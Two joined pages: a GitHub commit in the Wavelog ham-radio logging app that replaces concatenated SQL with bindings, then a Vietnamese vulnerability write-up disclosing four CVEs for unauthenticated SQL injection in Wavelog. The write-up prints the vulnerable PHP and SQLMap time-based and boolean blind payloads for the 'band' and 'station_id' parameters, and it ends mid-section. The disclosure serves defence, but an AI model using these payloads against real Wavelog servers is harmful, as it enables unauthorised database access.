=== Content from github.com_19eeb894_20250111_090826.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwavelog%2Fwavelog%2Fcommit%2F0bf2675d93602b591850790c8fcfced886eca423)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwavelog%2Fwavelog%2Fcommit%2F0bf2675d93602b591850790c8fcfced886eca423)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=wavelog%2Fwavelog)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[wavelog](/wavelog)
/
**[wavelog](/wavelog/wavelog)**
Public

* [Notifications](/login?return_to=%2Fwavelog%2Fwavelog) You must be signed in to change notification settings
* [Fork
  41](/login?return_to=%2Fwavelog%2Fwavelog)
* [Star
   187](/login?return_to=%2Fwavelog%2Fwavelog)

* [Code](/wavelog/wavelog)
* [Issues
  28](/wavelog/wavelog/issues)
* [Pull requests
  5](/wavelog/wavelog/pulls)
* [Discussions](/wavelog/wavelog/discussions)
* [Actions](/wavelog/wavelog/actions)
* [Wiki](/wavelog/wavelog/wiki)
* [Security](/wavelog/wavelog/security)
* [Insights](/wavelog/wavelog/pulse)

Additional navigation options

* [Code](/wavelog/wavelog)
* [Issues](/wavelog/wavelog/issues)
* [Pull requests](/wavelog/wavelog/pulls)
* [Discussions](/wavelog/wavelog/discussions)
* [Actions](/wavelog/wavelog/actions)
* [Wiki](/wavelog/wavelog/wiki)
* [Security](/wavelog/wavelog/security)
* [Insights](/wavelog/wavelog/pulse)

## Commit

[Permalink](/wavelog/wavelog/commit/0bf2675d93602b591850790c8fcfced886eca423)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Replace evil SQLs with bindings

[Browse files](/wavelog/wavelog/tree/0bf2675d93602b591850790c8fcfced886eca423)
Browse the repository at this point in the history

* Loading branch information

[![@int2001](https://avatars.githubusercontent.com/u/1410708?s=40&v=4)](/int2001)

[int2001](/wavelog/wavelog/commits?author=int2001 "View all commits by int2001")
committed
Sep 12, 2024

1 parent
[7d716d9](/wavelog/wavelog/commit/7d716d9a066778a769fbd36d95ad0afdba7d9327)

commit 0bf2675

Showing
**1 changed file**
with
**33 additions**
and
**30 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

63 changes: 33 additions & 30 deletions

63
[application/models/Stations.php](#diff-220683c3c980f85afa0b72a72ace12d921b7821b5587889515d8b9d78a28ab37 "application/models/Stations.php")

Show comments

[View file](/wavelog/wavelog/blob/0bf2675d93602b591850790c8fcfced886eca423/application/models/Stations.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -461,35 +461,38 @@ function stations\_with\_hrdlog\_code() { |
|  |  | } |
|  |  |  |
|  |  | function stations\_with\_qrz\_api\_key() { |
|  |  | $sql = "SELECT station\_profile.station\_id, station\_profile.station\_profile\_name, station\_profile.station\_callsign, modc.modcount, notc.notcount, totc.totcount |
|  |  | FROM station\_profile |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) modcount, station\_id |
|  |  | FROM ". $this->config->item('table\_name') . |
|  |  | " WHERE COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'M' |
|  |  | group by station\_id |
|  |  | ) as modc on station\_profile.station\_id = modc.station\_id |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) notcount, station\_id |
|  |  | FROM " . $this->config->item('table\_name') . |
|  |  | " WHERE (coalesce(COL\_QRZCOM\_QSO\_UPLOAD\_STATUS, '') = '' |
|  |  | or COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'N') |
|  |  | group by station\_id |
|  |  | ) as notc on station\_profile.station\_id = notc.station\_id |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) totcount, station\_id |
|  |  | FROM " . $this->config->item('table\_name') . |
|  |  | " WHERE COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'Y' |
|  |  | group by station\_id |
|  |  | ) as totc on station\_profile.station\_id = totc.station\_id |
|  |  | WHERE coalesce(station\_profile.qrzapikey, '') <> '' |
|  |  | AND station\_profile.user\_id = " . $this->session->userdata('user\_id'); |
|  |  | $query = $this->db->query($sql); |
|  |  |  |
|  |  | return $query; |
|  |  | $bindings=[]; |
|  |  | $sql = "SELECT station\_profile.station\_id, station\_profile.station\_profile\_name, station\_profile.station\_callsign, modc.modcount, notc.notcount, totc.totcount |
|  |  | FROM station\_profile |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) modcount, station\_id |
|  |  | FROM ". $this->config->item('table\_name') . |
|  |  | " WHERE COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'M' |
|  |  | group by station\_id |
|  |  | ) as modc on station\_profile.station\_id = modc.station\_id |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) notcount, station\_id |
|  |  | FROM " . $this->config->item('table\_name') . |
|  |  | " WHERE (coalesce(COL\_QRZCOM\_QSO\_UPLOAD\_STATUS, '') = '' |
|  |  | or COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'N') |
|  |  | group by station\_id |
|  |  | ) as notc on station\_profile.station\_id = notc.station\_id |
|  |  | LEFT OUTER JOIN ( |
|  |  | SELECT count(\*) totcount, station\_id |
|  |  | FROM " . $this->config->item('table\_name') . |
|  |  | " WHERE COL\_QRZCOM\_QSO\_UPLOAD\_STATUS = 'Y' |
|  |  | group by station\_id |
|  |  | ) as totc on station\_profile.station\_id = totc.station\_id |
|  |  | WHERE coalesce(station\_profile.qrzapikey, '') <> '' |
|  |  | AND station\_profile.user\_id = ?"; |
|  |  | $bindings[]=$this->session->userdata('user\_id'); |
|  |  | $query = $this->db->query($sql, $bindings); |
|  |  |  |
|  |  | return $query; |
|  |  | } |
|  |  |  |
|  |  | function stations\_with\_webadif\_api\_key() { |
|  |  | $bindings=[]; |
|  |  | $sql=" |
|  |  | SELECT station\_profile.station\_id, station\_profile.station\_profile\_name, station\_profile.station\_callsign, notc.c notcount, totc.c totcount |
|  |  | FROM station\_profile |
| Expand All | | @@ -508,15 +511,15 @@ function stations\_with\_webadif\_api\_key() { |
|  |  | ) totc ON station\_profile.station\_id = totc.station\_id |
|  |  | WHERE COALESCE(station\_profile.webadifapikey, '') <> '' |
|  |  | AND COALESCE(station\_profile.webadifapiurl, '') <> '' |
|  |  | AND station\_profile.user\_id = %d |
|  |  | AND station\_profile.user\_id = ? |
|  |  | "; |
|  |  | $bindings[]=$this->session->userdata('user\_id'); |
|  |  | $sql=sprintf( |
|  |  | $sql, |
|  |  | $this->config->item('table\_name'), |
|  |  | $this->config->item('table\_name'), |
|  |  | $this->session->userdata('user\_id') |
|  |  | $this->config->item('table\_name') |
|  |  | ); |
|  |  | return $this->db->query($sql); |
|  |  | return $this->db->query($sql,$bindings); |
|  |  | } |
|  |  |  |
|  |  | /\* |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0bf2675`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwavelog%2Fwavelog%2Fcommit%2F0bf2675d93602b591850790c8fcfced886eca423) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from chiggerlor.substack.com_3dcd5423_20250111_090825.html ===

[![](https://substackcdn.com/image/fetch/w_96,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](/)
# [Trung’s Substack](/)

SubscribeSign in
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F78c2ee17-9f05-4794-9002-eaf7af45493b_1024x732.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackUnauthenticated SQL Injection in Wavelog - Opensource project](https://substack.com/home/post/p-150197621?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore
# Unauthenticated SQL Injection in Wavelog - Opensource project

### CVE-2024-48249, CVE-2024-48251, CVE-2024-48257, CVE-2024-48261

[![](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](https://substack.com/%40chiggerabcd)[Trung](https://substack.com/%40chiggerabcd)Oct 14, 2024
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F78c2ee17-9f05-4794-9002-eaf7af45493b_1024x732.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackUnauthenticated SQL Injection in Wavelog - Opensource project](https://substack.com/home/post/p-150197621?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
# Lời nói đầu

Mình xin tự giới thiệu mình là **Trung** aka **chigger** . Mình là thành viên trong gia đình [CookieHanHoan](https://www.facebook.com/cookie.han.hoan).

Mình sẽ tiếp tục với hành trình spam nhiều CVE nhất có thể.

# Thông tin lỗ hổng

Bài viết này sẽ sử dụng phương pháp phân tích **Whitebox**, còn được gọi là **Source Code Audit** để phân tích source code và tìm ra lỗ hổng.

CVE-2024-48249:

* Điểm số: 7.3
* Mức độ nguy hiểm: HIGH
* Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CVE-2024-48251:

* Điểm số: 7.3
* Mức độ nguy hiểm: HIGH
* Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CVE-2024-48257:

* Điểm số: 7.3
* Mức độ nguy hiểm: HIGH
* Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CVE-2024-48261:

* Điểm số: 7.3
* Mức độ nguy hiểm: HIGH
* Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

# Mục tiêu

Wavelog là một ứng dụng PHP tự lưu trữ cho phép bạn ghi lại các liên hệ vô tuyến nghiệp dư của mình ở bất cứ đâu.

Mã nguồn: [Wavelog](https://github.com/wavelog/wavelog)

Nền tảng này được thiết kế bằng ngôn ngữ PHP và 1 số công nghệ nổi bật:

1. **Codeigniter 3**: Framework PHP cho phát triển ứng dụng web.
2. **Bootstrap 5**: Bộ công cụ giao diện người dùng CSS để thiết kế website.
3. **HTMX**: Được sử dụng để thực hiện các yêu cầu AJAX.
4. **jQuery**: Thư viện JavaScript để hỗ trợ các chức năng giao diện người dùng.
5. **Font Awesome**: Bộ biểu tượng được sử dụng để thêm các icon vào giao diện.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F78c2ee17-9f05-4794-9002-eaf7af45493b_1024x732.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/78c2ee17-9f05-4794-9002-eaf7af45493b_1024x732.png)
# Nguyên nhân gốc rễ (root-cause) gây ra lỗ hổng?

Lỗ hổng Injection, đặc biệt là SQL Injection, thường xuất phát từ việc ứng dụng không kiểm soát chặt chẽ dữ liệu đầu vào của người dùng, hay còn gọi là dữ liệu không đáng tin cậy (Untrusted Data). Trong nền tảng Wavelog, nhiều câu truy vấn SQL được viết thủ công dưới dạng raw query.

Ngoài ra, chức năng tồn tại lỗ hổng này không thực hiện xác thực người dùng, dẫn đến lỗ hổng được gọi là Unauthenticated SQL Injection, với điểm CVSS ở mức cao và cực kỳ nguy hiểm.

# CVE-2024-48249

Ở vị trí file `application/models/Gridmap_model.php`, mình nhận thấy trong function `get_band_confirmed()` đang xử lý các câu truy vấn bằng cách nối chuỗi trực tiếp (raw query). Cách làm này tiềm ẩn nguy cơ gây ra lỗ hổng SQL Injection.

Nếu các biến như: `$band`, `$sat`, `$propagation`, `$mode` nhận giá trị từ người dùng, thì có thể dẫn đến lỗ hổng SQL Injection.

```
class Gridmap_model extends CI_Model {

	function get_band_confirmed($band, $mode, $qsl, $lotw, $eqsl, $qrz, $sat, $orbit, $propagation, $logbooks_locations_array = NULL) {
		.....

		$location_list = "'".implode("','",$logbooks_locations_array)."'";

		$sql = 'SELECT distinct substring(COL_GRIDSQUARE,1,6) as GRID_SQUARES, COL_BAND FROM '
			.$this->config->item('table_name')
			.' LEFT JOIN `satellite` on '.$this->config->item('table_name').'.COL_SAT_NAME = satellite.name'
			.' WHERE station_id in ('
			.$location_list.') AND COL_GRIDSQUARE != ""';

		if ($band != 'All') {
			if ($band == 'SAT') {
				$sql .= " and col_prop_mode ='" . $band . "'";
				if ($sat != 'All' && $sat != '') {
					$sql .= " and col_sat_name ='" . $sat . "'";
				}
			} else {
				if ($propagation == 'None') {
					$sql .= " and (trim(col_prop_mode) ='' or col_prop_mode is null)";
				} elseif ($propagation == 'NoSAT') {
					$sql .= " and col_prop_mode !='SAT'";
				} elseif ($propagation != '') {
					$sql .= " and col_prop_mode ='" . $propagation . "'";
				}
				$sql .= " and col_band ='" . $band . "'";
			}
		} else {
			if ($propagation == 'None') {
				$sql .= " and (trim(col_prop_mode) ='' or col_prop_mode is null)";
			} elseif ($propagation == 'NoSAT') {
				$sql .= " and col_prop_mode !='SAT'";
			} elseif ($propagation != '') {
				$sql .= " and col_prop_mode ='" . $propagation . "'";
			}
		}

		if ($mode != 'All') {
			$sql .= " and (col_mode ='" . $mode . "' or col_submode ='" . $mode . "')";
		}

		$sql .= $this->addOrbitToQuery($orbit);

		$sql .= $this->addQslToQuery($qsl, $lotw, $eqsl, $qrz);

		return $this->db->query($sql);
	}
.....
}
```

Trong quá trình tìm kiếm, mình phát hiện rằng function này được gọi tại file `application/controllers/Gridmap.php` trong function `getGridsjs()`. Mặc dù các tham số đã được validate, nhưng việc validate này chỉ nhắm đến lỗ hổng XSS (Cross-Site Scripting) mà không kiểm tra các ký tự đặc biệt có thể gây lỗi cú pháp trong quá trình thực hiện truy vấn, dẫn đến nguy cơ tồn tại lỗ hổng SQL Injection.

```
class Gridmap extends CI_Controller {

	function __construct() {
		parent::__construct();
	}

   ...

	public function getGridsjs() {
		$band = $this->security->xss_clean($this->input->post('band'));
		$mode = $this->security->xss_clean($this->input->post('mode'));
		$qsl = $this->security->xss_clean($this->input->post('qsl'));
		$lotw = $this->security->xss_clean($this->input->post('lotw'));
		$eqsl = $this->security->xss_clean($this->input->post('eqsl'));
		$qrz = $this->security->xss_clean($this->input->post('qrz'));
		$sat = $this->security->xss_clean($this->input->post('sat'));
		$orbit = $this->security->xss_clean($this->input->post('orbit'));
		$propagation = $this->security->xss_clean($this->input->post('propagation'));
		$propagation = $this->db->escape($propagation);
		$this->load->model('gridmap_model');

		$array_grid_2char = array();
		$array_grid_4char = array();
		$array_grid_6char = array();

		$array_grid_2char_confirmed = array();
		$array_grid_4char_confirmed = array();
		$array_grid_6char_confirmed = array();

		$grid_2char = "";
		$grid_4char = "";
		$grid_6char = "";

		$grid_2char_confirmed = "";
		$grid_4char_confirmed = "";
		$grid_6char_confirmed = "";

		$query = $this->gridmap_model->get_band_confirmed($band, $mode, $qsl, $lotw, $eqsl, $qrz, $sat, $orbit, $propagation);
...
}

```

Hơn nữa, do file này không thực hiện xác thực phiên người dùng, nên dẫn đến nguy cơ tồn tại lỗ hổng Unauthenticated SQL Injection.

## Cách khai thác

Mình thử với kí tự đặc biệt **'**. Quan sát thấy server trả về `status code 500` của câu truy vấn. Vậy ở đây ở tham số `band`, `sat`, `propagation`, `mode` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F78f0641f-b984-47f6-8700-88c88260a4cc_1540x420.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/78f0641f-b984-47f6-8700-88c88260a4cc_1540x420.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: band=All' AND (SELECT 1241 FROM (SELECT(SLEEP(5)))zVSE) AND 'EgJT'='EgJT&mode=All&qsl=true&lotw=true&eqsl=false&qrz=false&orbit=All&sat=&propagation=111

```
# CVE-2024-48257

Ở vị trí file `application/models/Oqrs_model.php`, mình nhận thấy trong function `get_worked_modes()` đang xử lý các câu truy vấn bằng cách nối chuỗi trực tiếp (raw query). Cách làm này tiềm ẩn nguy cơ gây ra lỗ hổng SQL Injection.

Nếu biến `$station_id` nhận giá trị từ người dùng, thì có thể dẫn đến lỗ hổng SQL Injection.

```
class Oqrs_model extends CI_Model {
....
function get_worked_modes($station_id)
	{
		// get all worked modes from database
		$data = $this->db->query(
			"SELECT distinct LOWER(`COL_MODE`) as `COL_MODE` FROM `" . $this->config->item('table_name') . "` WHERE station_id in (" . $station_id . ") order by COL_MODE ASC"
		);
		$results = array();
		foreach ($data->result() as $row) {
			array_push($results, $row->COL_MODE);
		}

		$data = $this->db->query(
			"SELECT distinct LOWER(`COL_SUBMODE`) as `COL_SUBMODE` FROM `" . $this->config->item('table_name') . "` WHERE station_id in (" . $station_id . ") and coalesce(COL_SUBMODE, '') <> '' order by COL_SUBMODE ASC"
		);
		foreach ($data->result() as $row) {
			if (!in_array($row, $results)) {
				array_push($results, $row->COL_SUBMODE);
			}
		}

		return $results;
	}
....
}
```

Phân tích code, mình nhận thấy rằng function này được call từ function `get_qsos()` vẫn ở trong cùng 1 file model này. Sau khi phân tích,mình nhận thấy rằng function `get_qsos()`được call từ `application/controllers/Oqrs.php.`

```
class Oqrs extends CI_Controller {

	function __construct() {
		parent::__construct();
		// Commented out to get public access
		// $this->load->model('user_model');
		// if(!$this->user_model->authorize(2)) { $this->session->set_flashdata('error', __("You're not allowed to do that!")); redirect('dashboard'); }
		if (($this->config->item('disable_oqrs') ?? false)) { $this->session->set_flashdata('error', __("You're not allowed to do that!")); redirect('dashboard'); }
	}
.....
public function get_qsos() {
		$this->load->model('bands');
		$data['bands'] = $this->bands->get_worked_bands_oqrs($this->input->post('station_id', TRUE));

		$this->load->model('oqrs_model');
		$result = $this->oqrs_model->get_qsos($this->input->post('station_id', TRUE), $this->input->post('callsign', TRUE), $data['bands']);
		$data['callsign'] = $this->input->post('callsign', TRUE);
		$data['result'] = $result['qsoarray'];
		$data['qsocount'] = $result['qsocount'];

		$this->load->view('oqrs/result', $data);
	}
...
}
```

hân tích đoạn code trên cho thấy tham số `station_id` được truyền từ người dùng mà không qua quá trình kiểm tra (validate), dẫn đến lỗ hổng SQL Injection trong function này. Hơn nữa, trong function `__construct()`, nhà phát triển đã comment bỏ phần xác thực và ủy quyền, làm cho lỗ hổng này trở nên nghiêm trọng hơn, dẫn đến Unauthenticated SQL Injection.

## Cách khai thác

Mình thử với kí tự đặc biệt **'**. Quan sát thấy server trả về `status code 500` của câu truy vấn. Vậy ở đây ở tham số `Station_id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7f73319b-3563-41b1-85f7-f7fbc744d3e1_1539x375.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/7f73319b-3563-41b1-85f7-f7fbc744d3e1_1539x375.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: station_id=(SELECT (CASE WHEN (8465=8465) THEN 1 ELSE (SELECT 2332 UNION SELECT 7223) END))&callsign=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: station_id=1 AND (SELECT 1050 FROM (SELECT(SLEEP(5)))bEen)&callsign=1
```
# CVE-2024-48251, CVE-2024-48261

Ở vị trí file `application/models/Activated_gridmap_model.php`, mình nhận thấy trong function `get_band_confirmed()` đang xử lý các câu truy vấn bằng cách nối chuỗi trực tiếp (raw query). Cách làm này tiềm ẩn nguy cơ gây ra lỗ hổng SQL Injection.

Nếu các biến như: `$band`, `$sat`, `$propagation`, `$mode` nhận giá trị từ người dùng, thì có thể dẫn đến lỗ hổng SQL Injection.

```
class Activated_gridmap_model extends CI_Model {

	function get_band_confirmed($band, $mode, $qsl, $lotw, $eqsl, $qrz, $sat, $orbit, $propagation, $logbooks_locations_array = NULL) {
		.....

		$location_list = "'".implode("','",$logbooks_locations_array)."'";

		$sql = 'SELECT distinct substring(COL_GRIDSQUARE,1,6) as GRID_SQUARES, COL_BAND FROM '
			.$this->config->item('table_name')
			.' LEFT JOIN `satellite` on '.$this->config->item('table_name').'.COL_SAT_NAME = satellite.name'
			.' WHERE station_id in ('
			.$location_list.') AND COL_GRIDSQUARE != ""';

		if ($band != 'All') {
			if ($band == 'SAT') {
				$sql .= " and col_prop_mode ='" . $band . "'";
				if ($sat != 'All' && $sat != '') {
					$sql .= " and col_sat_name ='" . $sat . "'";
				}
			} else {
				if ($propagation == 'None') {
					$sql .= " and (trim(col_prop_mode) ='' or col_prop_mode is null)";
				} elseif ($propagation == 'NoSAT') {
					$sql .= " and col_prop_mode !='SAT'";
				} elseif ($propagation != '') {
					$sql .= " and col_prop_mode ='" . $propagation . "'";
				}
				$sql .= " and col_band ='" . $band . "'";
			}
		} else {
			if ($propagation == 'None') {
				$sql .= " and (trim(col_prop_mode) ='' or col_prop_mode is null)";
			} elseif ($propagation == 'NoSAT') {
				$sql .= " and col_prop_mode !='SAT'";
			} elseif ($propagation != '') {
				$sql .= " and col_prop_mode ='" . $propagation . "'";
			}
		}

		if ($mode != 'All') {
			$sql .= " and (col_mode ='" . $mode . "' or col_submode ='" . $mode . "')";
		}

		$sql .= $this->addOrbitToQuery($orbit);

		$sql .= $this->addQslToQuery($qsl, $lotw, $eqsl, $qrz);

		return $this->db->query($sql);
	}
.....
}
```

Trong quá trình tìm kiếm, mình phát hiện rằng function này được gọi tại file `application/controllers/Gridmap.php` trong function `getGridsjs()`. Mặc dù các tham số đã được validate, nhưng việc validate này chỉ nhắm đến lỗ hổng XSS (Cross-Site Scripting) mà không kiểm tra các ký tự đặc biệt có thể gây lỗi cú pháp trong quá trình thực hiện truy vấn, dẫn đến nguy cơ tồn tại lỗ hổng SQL Injection.

```
class Activated_gridmap extends CI_Controller {

	function __construct() {
		parent::__construct();
	}

   ...

	public function getGridsjs() {
		$band = $this->security->xss_clean($this->input->post('band'));
		$mode = $this->security->xss_clean($this->input->post('mode'));
		$qsl = $this->security->xss_clean($this->input->post('qsl'));
		$lotw = $this->security->xss_clean($this->input->post('lotw'));
		$eqsl = $this->security->xss_clean($this->input->post('eqsl'));
		$qrz = $this->security->xss_clean($this->input->post('qrz'));
		$sat = $this->security->xss_clean($this->input->post('sat'));
		$orbit = $this->security->xss_clean($this->input->post('orbit'));
		$propagation = $this->security->xss_clean($this->input->post('propagation'));
		$propagation = $this->db->escape($propagation);
		$this->load->model('gridmap_model');

		$array_grid_2char = array();
		$array_grid_4char = array();
		$array_grid_6char = array();

		$array_grid_2char_confirmed = array();
		$array_grid_4char_confirmed = array();
		$array_grid_6char_confirmed = array();

		$grid_2char = "";
		$grid_4char = "";
		$grid_6char = "";

		$grid_2char_confirmed = "";
		$grid_4char_confirmed = "";
		$grid_6char_confirmed = "";

		$query = $this->gridmap_model->get_band_confirmed($band, $mode, $qsl, $lotw, $eqsl, $qrz, $sat, $orbit, $propagation);
...
}

```

Hơn nữa, do file này không thực hiện xác thực phiên người dùng, nên dẫn đến nguy cơ tồn tại lỗ hổng Unauthenticated SQL Injection.

## Cách khai thác

Mình thử với kí tự đặc biệt **'**. Quan sát thấy server trả về `status code 500` của câu truy vấn. Vậy ở đây ở tham số `band`, `sat`, `propagation`, `mode` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8176c58f-56b4-4b46-bef8-8e0923c93fd8_1546x441.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/8176c58f-56b4-4b46-bef8-8e0923c93fd8_1546x441.png)

